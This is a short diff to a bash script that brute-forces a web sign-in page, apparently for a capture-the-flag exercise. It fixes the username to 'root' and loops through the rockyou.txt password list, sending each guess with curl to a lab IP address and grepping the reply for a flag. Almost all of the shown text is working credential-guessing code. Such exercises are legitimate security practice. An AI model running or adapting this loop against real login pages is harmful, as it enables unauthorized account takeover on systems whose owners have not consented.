@@ -40,14 +40,15 @@ commonPasswd=('123456'
 'abc123'
 );
 
-commonLogin=('dragon' 'user' 'flag' 'darkly' 'login' 'username' 'marvin' 'prism' 'root' 'admin');
+commonLogin=('root');
 #tested for : 'root' 'admin' 'dragon' 'user' 'flag' 'darkly' 'login' 'username' 'marvin' 'laurie' 'zaz' 'thor' 'ly' 'mathieu' 'prism'
 
 for login in "${commonLogin[@]}"
 do
-	for passwd in "${commonPasswd[@]}"
+	input="./rockyou.txt"
+	while IFS= read -r passwd
 	do
 		echo "testing $login with $passwd"
 		curl -s "http://10.11.200.246/?page=signin&username=$login&password=$passwd&Login=Login#" | grep -i "flag"
-	done
+	done < "$input"
 done
